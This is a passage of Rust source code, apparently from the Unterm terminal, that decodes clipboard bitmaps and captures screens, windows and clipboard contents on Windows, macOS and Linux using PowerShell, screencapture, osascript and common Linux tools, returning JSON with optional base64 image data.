                    "Unsupported DIB compression: {}. BI_RGB and BI_BITFIELDS are supported.",
                    compression
                ));
            }

            if bit_count != 24 && bit_count != 32 {
                unsafe {
                    GlobalUnlock(handle);
                }
                return Err(anyhow!(
                    "Unsupported DIB bit depth: {}. Only 24-bit and 32-bit are supported.",
                    bit_count
                ));
            }

            let bytes_per_pixel = (bit_count / 8) as usize;
            let row_stride = ((width as usize * bytes_per_pixel + 3) / 4) * 4;
            let header_size = bih.biSize as usize;
            let mut pixel_offset = header_size;
            let mut channel_masks = None;
            if compression == 3 {
                if bit_count != 32 {
                    unsafe {
                        GlobalUnlock(handle);
                    }
                    return Err(anyhow!(
                        "Unsupported BI_BITFIELDS bit depth: {}. Only 32-bit is supported.",
                        bit_count
                    ));
                }
                let mask_offset = if header_size >= 52 { 40 } else { header_size };
                if mask_offset + 12 > data_size {
                    unsafe {
                        GlobalUnlock(handle);
                    }
                    return Err(anyhow!("DIB channel masks exceed clipboard buffer size"));
                }
                let read_mask = |offset: usize| unsafe {
                    u32::from_le_bytes([
                        *((ptr as *const u8).add(offset)),
                        *((ptr as *const u8).add(offset + 1)),
                        *((ptr as *const u8).add(offset + 2)),
                        *((ptr as *const u8).add(offset + 3)),
                    ])
                };
                let alpha_mask = if header_size >= 56 { read_mask(52) } else { 0 };
                channel_masks = Some((
                    read_mask(mask_offset),
                    read_mask(mask_offset + 4),
                    read_mask(mask_offset + 8),
                    alpha_mask,
                ));
                if header_size == std::mem::size_of::<BITMAPINFOHEADER>() {
                    pixel_offset += 12;
                }
            }
            let total_pixel_bytes = row_stride * height as usize;

            if pixel_offset + total_pixel_bytes > data_size {
                unsafe {
                    GlobalUnlock(handle);
                }
                return Err(anyhow!("DIB pixel data exceeds clipboard buffer size"));
            }

            let pixel_data = unsafe {
                std::slice::from_raw_parts((ptr as *const u8).add(pixel_offset), total_pixel_bytes)
            };

            let mut rgba_buf = vec![0u8; (width * height * 4) as usize];
            let bottom_up = height_signed > 0;

            for y in 0..height as usize {
                let src_y = if bottom_up {
                    height as usize - 1 - y
                } else {
                    y
                };
                let src_row = &pixel_data
                    [src_y * row_stride..src_y * row_stride + width as usize * bytes_per_pixel];
                let dst_offset = y * width as usize * 4;

                for x in 0..width as usize {
                    let si = x * bytes_per_pixel;
                    let di = dst_offset + x * 4;
                    if let Some((red, green, blue, alpha)) = channel_masks {
                        let pixel = u32::from_le_bytes([
                            src_row[si],
                            src_row[si + 1],
                            src_row[si + 2],
                            src_row[si + 3],
                        ]);
                        rgba_buf[di] = masked_channel(pixel, red, 0);
                        rgba_buf[di + 1] = masked_channel(pixel, green, 0);
                        rgba_buf[di + 2] = masked_channel(pixel, blue, 0);
                        rgba_buf[di + 3] = masked_channel(pixel, alpha, 255);
                    } else {
                        rgba_buf[di] = src_row[si + 2];
                        rgba_buf[di + 1] = src_row[si + 1];
                        rgba_buf[di + 2] = src_row[si];
                        rgba_buf[di + 3] = if bytes_per_pixel == 4 {
                            src_row[si + 3]
                        } else {
                            255
                        };
                    }
                }
            }

            unsafe {
                GlobalUnlock(handle);
            }

            let img = image::RgbaImage::from_raw(width, height, rgba_buf)
                .ok_or_else(|| anyhow!("Failed to create image buffer from DIB data"))?;

            let clipboard_dir = unterm_protocol::state_dir()
                .unwrap_or_else(|| std::path::PathBuf::from(".unterm"))
                .join("clipboard");
            std::fs::create_dir_all(&clipboard_dir)
                .context("Failed to create clipboard output directory")?;

            let timestamp = chrono::Local::now().format("%Y%m%d_%H%M%S_%3f");
            let filename = format!("clipboard_{}.png", timestamp);
            let file_path = clipboard_dir.join(&filename);

            img.save(&file_path)
                .context("Failed to save clipboard image as PNG")?;

            let path_str = file_path.to_string_lossy().to_string();
            let png_bytes = std::fs::read(&file_path)
                .context("Failed to read saved clipboard PNG for base64 encoding")?;
            let b64 = base64::engine::general_purpose::STANDARD.encode(&png_bytes);

            return Ok(json!({
                "type": "image",
                "format": "png",
                "image_path": path_str,
                "width": width,
                "height": height,
                "bit_depth": bit_count,
                "size_bytes": png_bytes.len(),
                "base64": b64,
            }));
        }
    }

    if has_text {
        let handle: HGLOBAL = unsafe { GetClipboardData(CF_UNICODETEXT as u32) as HGLOBAL };
        if handle.is_null() {
            return Err(anyhow!("GetClipboardData(CF_UNICODETEXT) returned NULL"));
        }

        let ptr = unsafe { GlobalLock(handle) };
        if ptr.is_null() {
            return Err(anyhow!("GlobalLock failed on clipboard text data"));
        }

        let wchar_ptr = ptr as *const u16;
        let mut len = 0usize;
        unsafe {
            while *wchar_ptr.add(len) != 0 {
                len += 1;
            }
        }
        let wstr = unsafe { std::slice::from_raw_parts(wchar_ptr, len) };
        let text = String::from_utf16_lossy(wstr);

        unsafe {
            GlobalUnlock(handle);
        }

        return Ok(json!({"type": "text", "content": text}));
    }

    Err(anyhow!("Clipboard is empty"))
}

#[cfg(windows)]
fn ps_single_quote(value: &str) -> String {
    format!("'{}'", value.replace('\'', "''"))
}

#[cfg(windows)]
fn run_powershell_json(script: &str) -> Result<Value> {
    let script = format!(
        "[Console]::OutputEncoding = [System.Text.UTF8Encoding]::new($false)\n$OutputEncoding = [Console]::OutputEncoding\n{}",
        script
    );
    let mut bytes = Vec::with_capacity(script.len() * 2);
    for unit in script.encode_utf16() {
        bytes.extend_from_slice(&unit.to_le_bytes());
    }
    let encoded = base64::engine::general_purpose::STANDARD.encode(bytes);
    let mut command = std::process::Command::new("powershell.exe");
    command.args([
        "-NoProfile",
        "-NonInteractive",
        "-ExecutionPolicy",
        "Bypass",
        "-EncodedCommand",
        &encoded,
    ]);
    {
        use std::os::windows::process::CommandExt;
        command.creation_flags(0x08000000);
    }
    let output = command.output().context("run PowerShell capture helper")?;
    if !output.status.success() {
        return Err(anyhow!(
            "PowerShell helper failed: {}",
            String::from_utf8_lossy(&output.stderr).trim()
        ));
    }
    let stdout = String::from_utf8_lossy(&output.stdout);
    let value: Value =
        serde_json::from_str(stdout.trim()).context("parse PowerShell helper JSON output")?;
    Ok(value)
}

#[cfg(windows)]
pub fn capture_screen_image(include_base64: bool) -> Result<Value> {
    let path = capture_output_dir()?.join(format!(
        "screen_{}.png",
        chrono::Local::now().format("%Y%m%d_%H%M%S_%3f")
    ));
    let path = path.display().to_string();
    let qpath = ps_single_quote(&path);
    let script = format!(
        r#"
$ErrorActionPreference = 'Stop'
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms
$bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
$gfx = [System.Drawing.Graphics]::FromImage($bmp)
$gfx.CopyFromScreen($bounds.Left, $bounds.Top, 0, 0, $bmp.Size)
$bmp.Save({qpath}, [System.Drawing.Imaging.ImageFormat]::Png)
$gfx.Dispose()
$bmp.Dispose()
[pscustomobject]@{{
  path = {qpath}
  width = $bounds.Width
  height = $bounds.Height
  left = $bounds.Left
  top = $bounds.Top
}} | ConvertTo-Json -Compress
"#
    );
    append_base64_if_requested(run_powershell_json(&script)?, include_base64)
}

#[cfg(windows)]
pub fn capture_window_image(
    title_filter: Option<&str>,
    pid_filter: Option<u32>,
    include_base64: bool,
) -> Result<Value> {
    let path = capture_output_dir()?.join(format!(
        "window_{}.png",
        chrono::Local::now().format("%Y%m%d_%H%M%S_%3f")
    ));
    let path = path.display().to_string();
    let qpath = ps_single_quote(&path);
    let title = title_filter
        .map(ps_single_quote)
        .unwrap_or_else(|| "$null".to_string());
    let pid = pid_filter.unwrap_or_else(std::process::id);
    let script = format!(
        r#"
$ErrorActionPreference = 'Stop'
Add-Type -AssemblyName System.Drawing
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class UntermCapture {{
  [DllImport("user32.dll")] public static extern bool GetWindowRect(IntPtr hWnd, out RECT rect);
  [DllImport("user32.dll")] public static extern bool PrintWindow(IntPtr hWnd, IntPtr hdcBlt, uint flags);
  [DllImport("user32.dll")] public static extern bool IsIconic(IntPtr hWnd);
  [DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int command);
  [DllImport("user32.dll")] public static extern bool SetForegroundWindow(IntPtr hWnd);
  [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
}}
public struct RECT {{ public int Left; public int Top; public int Right; public int Bottom; }}
"@
$pidFilter = {pid}
$titleFilter = {title}
if ($titleFilter -ne $null) {{
  $proc = Get-Process | Where-Object {{ $_.MainWindowHandle -ne 0 -and $_.MainWindowTitle -like "*$titleFilter*" }} | Select-Object -First 1
}} else {{
  $proc = Get-Process -Id $pidFilter -ErrorAction Stop
}}
if ($null -eq $proc -or $proc.MainWindowHandle -eq 0) {{ throw "No matching window found" }}
$hwnd = $proc.MainWindowHandle
if ([UntermCapture]::IsIconic($hwnd)) {{
  [UntermCapture]::ShowWindowAsync($hwnd, 9) | Out-Null
  Start-Sleep -Milliseconds 120
}}
$rect = New-Object RECT
# PrintWindow renders against the real HWND dimensions. DWM's extended frame
# bounds can be several pixels shorter and causes GPU-backed windows to return
# a false/blank frame when that smaller bitmap is supplied.
if (-not [UntermCapture]::GetWindowRect($hwnd, [ref]$rect)) {{ throw "GetWindowRect failed" }}
$width = $rect.Right - $rect.Left
$height = $rect.Bottom - $rect.Top
if ($width -le 0 -or $height -le 0) {{ throw "Invalid window bounds" }}
$bmp = New-Object System.Drawing.Bitmap $width, $height
$gfx = [System.Drawing.Graphics]::FromImage($bmp)
$hdc = $gfx.GetHdc()
try {{
  # PW_RENDERFULLCONTENT asks DWM/composited windows for their complete client
  # surface even when another application covers them.
  $printed = [UntermCapture]::PrintWindow($hwnd, $hdc, 2)
}} finally {{
  $gfx.ReleaseHdc($hdc)
}}
$mode = 'print_window'

# Some GPU drivers return success but leave a uniformly black bitmap. Sample
# a small grid so that such a frame cannot masquerade as a valid self-capture.
$samples = New-Object 'System.Collections.Generic.HashSet[int]'
foreach ($xf in @(0.1, 0.3, 0.5, 0.7, 0.9)) {{
  foreach ($yf in @(0.1, 0.3, 0.5, 0.7, 0.9)) {{
    $x = [Math]::Min($width - 1, [Math]::Max(0, [int]($width * $xf)))
    $y = [Math]::Min($height - 1, [Math]::Max(0, [int]($height * $yf)))
    [void]$samples.Add($bmp.GetPixel($x, $y).ToArgb())
  }}
}}
if (-not $printed -or $samples.Count -lt 2) {{
  # GPU surfaces may not implement PrintWindow. Recreate the GDI objects
  # before screen capture (the old Graphics has handed out an HDC), briefly
  # focus the exact target, then restore the user's previous foreground app.
  $gfx.Dispose()
  $bmp.Dispose()
  $bmp = New-Object System.Drawing.Bitmap $width, $height
  $gfx = [System.Drawing.Graphics]::FromImage($bmp)
  $previousForeground = [UntermCapture]::GetForegroundWindow()
  [UntermCapture]::ShowWindowAsync($hwnd, 5) | Out-Null
  [UntermCapture]::SetForegroundWindow($hwnd) | Out-Null
  Start-Sleep -Milliseconds 220
  try {{
    $gfx.CopyFromScreen($rect.Left, $rect.Top, 0, 0, $bmp.Size)
  }} finally {{
    if ($previousForeground -ne [IntPtr]::Zero -and $previousForeground -ne $hwnd) {{
      [UntermCapture]::SetForegroundWindow($previousForeground) | Out-Null
    }}
  }}
  $mode = 'focused_screen'
}}
$bmp.Save({qpath}, [System.Drawing.Imaging.ImageFormat]::Png)
$gfx.Dispose()
$bmp.Dispose()
[pscustomobject]@{{
  path = {qpath}
  width = $width
  height = $height
  left = $rect.Left
  top = $rect.Top
  pid = $proc.Id
  title = $proc.MainWindowTitle
  mode = $mode
}} | ConvertTo-Json -Compress
"#
    );
    append_base64_if_requested(run_powershell_json(&script)?, include_base64)
}

// ---------------------------------------------------------------------------
// macOS implementations (screencapture + osascript)
// ---------------------------------------------------------------------------

/// Read PNG dimensions cheaply (no full decode) for capture metadata.
/// Falls back to 0x0 if anything goes wrong — purely informational.
#[cfg(unix)]
fn png_dimensions(path: &std::path::Path) -> (u32, u32) {
    use std::io::Read;
    let mut file = match std::fs::File::open(path) {
        Ok(f) => f,
        Err(_) => return (0, 0),
    };
    let mut header = [0u8; 24];
    if file.read_exact(&mut header).is_err() {
        return (0, 0);
    }
    // PNG: 8-byte signature + 4-byte length + 4-byte "IHDR" + 4-byte width + 4-byte height
    if &header[0..8] != b"\x89PNG\r\n\x1a\n" || &header[12..16] != b"IHDR" {
        return (0, 0);
    }
    let w = u32::from_be_bytes([header[16], header[17], header[18], header[19]]);
    let h = u32::from_be_bytes([header[20], header[21], header[22], header[23]]);
    (w, h)
}

#[cfg(target_os = "macos")]
pub fn capture_screen_image(include_base64: bool) -> Result<Value> {
    let dir = capture_output_dir()?;
    let path = dir.join(format!(
        "screen_{}.png",
        chrono::Local::now().format("%Y%m%d_%H%M%S_%3f")
    ));

    // -x = no shutter sound, -t png = explicit format
    let status = std::process::Command::new("/usr/sbin/screencapture")
        .args(["-x", "-t", "png"])
        .arg(&path)
        .status()
        .context("invoke /usr/sbin/screencapture")?;
    if !status.success() {
        return Err(anyhow!("screencapture exited with {status}"));
    }
    if !path.exists() {
        return Err(anyhow!("screencapture did not produce {}", path.display()));
    }

    let (width, height) = png_dimensions(&path);
    let value = json!({
        "path": path.display().to_string(),
        "width": width,
        "height": height,
        "left": 0,
        "top": 0,
    });
    append_base64_if_requested(value, include_base64)
}

#[cfg(target_os = "macos")]
pub fn capture_window_image(
    title_filter: Option<&str>,
    pid_filter: Option<u32>,
    include_base64: bool,
) -> Result<Value> {
    // macOS `screencapture -l <CGWindowID>` captures a specific window without
    // any UI. We just have to translate (pid, title) → CGWindowID via
    // CGWindowListCopyWindowInfo. If neither filter is supplied, fall back
    // to the calling process's own pid (i.e. capture this Unterm window).
    let target_pid = pid_filter.unwrap_or_else(std::process::id);
    let is_self = target_pid == std::process::id();
    // Self-capture race: right after window creation, the NSWindow exists
    // but CGWindowList may not yet flag it onScreen, so find returns None
    // and the caller silently gets a full-screen fallback instead of their
    // own chrome. For self-targets we briefly retry — five 120 ms ticks
    // (~600 ms ceiling) covers every startup we've measured. External-pid
    // captures still single-shot to avoid blocking on a wrong pid.
    let attempts = if is_self { 5 } else { 1 };
    let mut window_id_opt = None;
    let mut last_err = None;
    for attempt in 0..attempts {
        match find_cg_window_id(target_pid, title_filter) {
            Ok(Some(id)) => {
                window_id_opt = Some(id);
                break;
            }
            Ok(None) => {
                if attempt + 1 < attempts {
                    std::thread::sleep(std::time::Duration::from_millis(120));
                }
            }
            Err(err) => {
                last_err = Some(err);
                break;
            }
        }
    }
    if let Some(err) = last_err {
        return Err(err);
    }
    let window_id = match window_id_opt {
        Some(id) => id,
        None => {
            // No matching on-screen window — degrade to full-screen capture so
            // the caller still gets pixels rather than an error.
            let mut value = capture_screen_image(false)?;
            if let Some(obj) = value.as_object_mut() {
                obj.insert("mode".into(), json!("screen_fallback"));
                obj.insert(
                    "note".into(),
                    json!(format!(
                        "no on-screen window matched pid={} title={:?}; returned full screen",
                        target_pid, title_filter
                    )),
                );
            }
            return append_base64_if_requested(value, include_base64);
        }
    };

    let dir = capture_output_dir()?;
    let path = dir.join(format!(
        "window_{}.png",
        chrono::Local::now().format("%Y%m%d_%H%M%S_%3f")
    ));
    let status = std::process::Command::new("/usr/sbin/screencapture")
        .args(["-x", "-o", "-t", "png", "-l", &window_id.to_string()])
        .arg(&path)
        .status()
        .context("invoke /usr/sbin/screencapture -l")?;
    if !status.success() || !path.exists() {
        return Err(anyhow!(
            "screencapture -l {} failed (status {:?}, path exists: {})",
            window_id,
            status.code(),
            path.exists()
        ));
    }

    let (width, height) = png_dimensions(&path);
    let value = json!({
        "path": path.display().to_string(),
        "width": width,
        "height": height,
        "pid": target_pid,
        "window_id": window_id,
    });
    append_base64_if_requested(value, include_base64)
}

/// Return the first on-screen CGWindowID belonging to `pid` (and optionally
/// containing `title_substr`), or None if no match.
#[cfg(target_os = "macos")]
fn find_cg_window_id(pid: u32, title_substr: Option<&str>) -> Result<Option<u32>> {
    use core_foundation::array::CFArray;
    use core_foundation::base::{CFType, TCFType};
    use core_foundation::dictionary::CFDictionary;
    use core_foundation::number::CFNumber;
    use core_foundation::string::CFString;
    use core_graphics::display::{
        kCGNullWindowID, kCGWindowListExcludeDesktopElements, kCGWindowListOptionOnScreenOnly,
        CGWindowListCopyWindowInfo,
    };

    let info: CFArray<CFDictionary<CFString, CFType>> = unsafe {
        let raw = CGWindowListCopyWindowInfo(
            kCGWindowListOptionOnScreenOnly | kCGWindowListExcludeDesktopElements,
            kCGNullWindowID,
        );
        if raw.is_null() {
            return Ok(None);
        }
        CFArray::wrap_under_create_rule(raw)
    };

    let pid_key = CFString::from_static_string("kCGWindowOwnerPID");
    let id_key = CFString::from_static_string("kCGWindowNumber");
    let name_key = CFString::from_static_string("kCGWindowName");

    for entry in info.iter() {
        let owner_pid: i64 = entry
            .find(&pid_key)
            .and_then(|v| v.downcast::<CFNumber>())
            .and_then(|n| n.to_i64())
            .unwrap_or(-1);
        if owner_pid as u32 != pid {
            continue;
        }
        if let Some(needle) = title_substr {
            let window_title = entry
                .find(&name_key)
                .and_then(|v| v.downcast::<CFString>())
                .map(|s| s.to_string())
                .unwrap_or_default();
            if !window_title.contains(needle) {
                continue;
            }
        }
        let window_id: i64 = entry
            .find(&id_key)
            .and_then(|v| v.downcast::<CFNumber>())
            .and_then(|n| n.to_i64())
            .unwrap_or(0);
        if window_id > 0 {
            return Ok(Some(window_id as u32));
        }
    }
    Ok(None)
}

#[cfg(target_os = "macos")]
fn clipboard_read_macos() -> Result<Value> {
    // 1) If pasteboard contains an image, write it to a PNG and return.
    //    osascript exits non-zero when the cast to PNGf fails (i.e. no image).
    let dir = unterm_protocol::state_dir()
        .unwrap_or_else(|| std::path::PathBuf::from(".unterm"))
        .join("clipboard");
    std::fs::create_dir_all(&dir).context("create clipboard output dir")?;
    let timestamp = chrono::Local::now().format("%Y%m%d_%H%M%S_%3f");
    let png_path = dir.join(format!("clipboard_{}.png", timestamp));

    let script = format!(
        "try\n  set theData to the clipboard as «class PNGf»\n  set fp to open for access POSIX file \"{}\" with write permission\n  set eof of fp to 0\n  write theData to fp\n  close access fp\n  return \"image\"\non error\n  try\n    close access fp\n  end try\n  return \"none\"\nend try",
        png_path.display()
    );
    let out = std::process::Command::new("osascript")
        .args(["-e", &script])
        .output()
        .context("invoke osascript for clipboard image probe")?;
    let kind = String::from_utf8_lossy(&out.stdout).trim().to_string();

    if kind == "image" && png_path.exists() {
        let png_bytes = std::fs::read(&png_path)?;
        let (width, height) = png_dimensions(&png_path);
        let b64 = base64::engine::general_purpose::STANDARD.encode(&png_bytes);
        return Ok(json!({
            "type": "image",
            "format": "png",
            "image_path": png_path.display().to_string(),
            "width": width,
            "height": height,
            "size_bytes": png_bytes.len(),
            "base64": b64,
        }));
    }

    // Cleanup empty file if osascript wrote a zero-byte file before failing
    if png_path.exists() {
        let _ = std::fs::remove_file(&png_path);
    }

    // 2) Fall back to text via pbpaste.
    let out = std::process::Command::new("pbpaste")
        .output()
        .context("invoke pbpaste")?;
    if !out.status.success() {
        return Err(anyhow!(
            "pbpaste failed: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        ));
    }
    let text = String::from_utf8_lossy(&out.stdout).to_string();
    if text.is_empty() {
        return Err(anyhow!("Clipboard is empty"));
    }
    Ok(json!({"type": "text", "content": text}))
}

// ---------------------------------------------------------------------------
// Linux implementations (probe grim/gnome-screenshot/spectacle/scrot/maim)
// ---------------------------------------------------------------------------

#[cfg(all(unix, not(target_os = "macos")))]
pub fn capture_screen_image(include_base64: bool) -> Result<Value> {
    let dir = capture_output_dir()?;
    let path = dir.join(format!(
        "screen_{}.png",
        chrono::Local::now().format("%Y%m%d_%H%M%S_%3f")
    ));
    let path_str = path.display().to_string();

    // Probe each tool in order; the first that exists is used. No interactive
    // selection — we want a full-screen PNG.
    let candidates: &[(&str, &[&str])] = &[
        ("grim", &[]),                       // grim <file>
        ("gnome-screenshot", &["-f"]),       // gnome-screenshot -f <file>
        ("spectacle", &["-bn", "-f", "-o"]), // spectacle -bn -f -o <file>
        ("scrot", &[]),                      // scrot <file>
        ("maim", &[]),                       // maim <file>
    ];

    let mut last_err: Option<String> = None;
    for (tool, args) in candidates {
        if !unix_command_exists(tool) {
            continue;
        }
        let mut cmd = std::process::Command::new(tool);
        cmd.args(*args);
        cmd.arg(&path_str);
        match cmd.status() {
            Ok(s) if s.success() && path.exists() => {
                let (width, height) = png_dimensions(&path);
                let value = json!({
                    "path": path_str,
                    "width": width,
                    "height": height,
                    "left": 0,
                    "top": 0,
                });
                return append_base64_if_requested(value, include_base64);
            }
            Ok(s) => last_err = Some(format!("{tool} exited with {s}")),
            Err(e) => last_err = Some(format!("failed to run {tool}: {e}")),
        }
    }

    Err(anyhow!(
        "{}",
        last_err.unwrap_or_else(|| "No screenshot tool found. Install one of: grim, gnome-screenshot, spectacle, scrot, or maim".into())
    ))
}

#[cfg(all(unix, not(target_os = "macos")))]
pub fn capture_window_image(
    _title_filter: Option<&str>,
    _pid_filter: Option<u32>,
    include_base64: bool,
) -> Result<Value> {
    // We don't have a robust cross-WM way to locate a window by pid/title
    // without xdotool/wmctrl + a lot of glue. For headless MCP we fall back
    // to a full-screen capture so the caller still gets pixels.
    let mut value = capture_screen_image(false)?;
    if let Some(obj) = value.as_object_mut() {
        obj.insert("mode".into(), json!("screen_fallback"));
        obj.insert(
            "note".into(),
            json!("Linux MCP capture currently falls back to full screen; install xdotool/wmctrl to wire window-pick up if needed"),
        );
    }
    append_base64_if_requested(value, include_base64)
}

#[cfg(all(unix, not(target_os = "macos")))]
fn clipboard_read_linux() -> Result<Value> {
    // 1) Try image via wl-paste / xclip first.
    let dir = unterm_protocol::state_dir()
        .unwrap_or_else(|| std::path::PathBuf::from(".unterm"))
        .join("clipboard");
    std::fs::create_dir_all(&dir).context("create clipboard output dir")?;
    let timestamp = chrono::Local::now().format("%Y%m%d_%H%M%S_%3f");
    let png_path = dir.join(format!("clipboard_{}.png", timestamp));

    let mut got_image = false;

    if unix_command_exists("wl-paste") {
        // Check available types; if image/png is offered, save it.
        let types = std::process::Command::new("wl-paste")
            .args(["--list-types"])
            .output();
        if let Ok(out) = types {
            let listed = String::from_utf8_lossy(&out.stdout);
            if listed.lines().any(|t| t.trim() == "image/png") {
                let f = std::fs::File::create(&png_path)?;
                let status = std::process::Command::new("wl-paste")
                    .args(["--type", "image/png"])
                    .stdout(f)
                    .status()?;
                if status.success() && png_path.exists() && std::fs::metadata(&png_path)?.len() > 0
                {
                    got_image = true;
                }
            }
        }
    }

    if !got_image && unix_command_exists("xclip") {
        // xclip -selection clipboard -t TARGETS -o -> list of mime types
        let targets = std::process::Command::new("xclip")
            .args(["-selection", "clipboard", "-t", "TARGETS", "-o"])
            .output();
        if let Ok(out) = targets {
            let listed = String::from_utf8_lossy(&out.stdout);
            if listed.lines().any(|t| t.trim() == "image/png") {
                let f = std::fs::File::create(&png_path)?;
                let status = std::process::Command::new("xclip")
                    .args(["-selection", "clipboard", "-t", "image/png", "-o"])
                    .stdout(f)
                    .status()?;
                if status.success() && png_path.exists() && std::fs::metadata(&png_path)?.len() > 0
                {
                    got_image = true;
                }
            }
        }
    }

    if got_image {
        let png_bytes = std::fs::read(&png_path)?;
        let (width, height) = png_dimensions(&png_path);
        let b64 = base64::engine::general_purpose::STANDARD.encode(&png_bytes);
        return Ok(json!({
            "type": "image",
            "format": "png",
            "image_path": png_path.display().to_string(),
            "width": width,
            "height": height,
            "size_bytes": png_bytes.len(),
            "base64": b64,
        }));
    }

    if png_path.exists() {
        let _ = std::fs::remove_file(&png_path);
    }

    // 2) Text fallback.
    let text_cmds: &[(&str, &[&str])] = &[
        ("wl-paste", &["--no-newline"]),
        ("xclip", &["-selection", "clipboard", "-o"]),
        ("xsel", &["--clipboard", "--output"]),
    ];
    for (cmd, args) in text_cmds {
        if !unix_command_exists(cmd) {
            continue;
        }
        let out = std::process::Command::new(cmd).args(*args).output();
        if let Ok(out) = out {
            if out.status.success() {
                let text = String::from_utf8_lossy(&out.stdout).to_string();
                if !text.is_empty() {
                    return Ok(json!({"type": "text", "content": text}));
                }
            }
        }
    }

    Err(anyhow!(
        "Clipboard is empty or no clipboard tool available (install wl-clipboard, xclip, or xsel)"
    ))
}
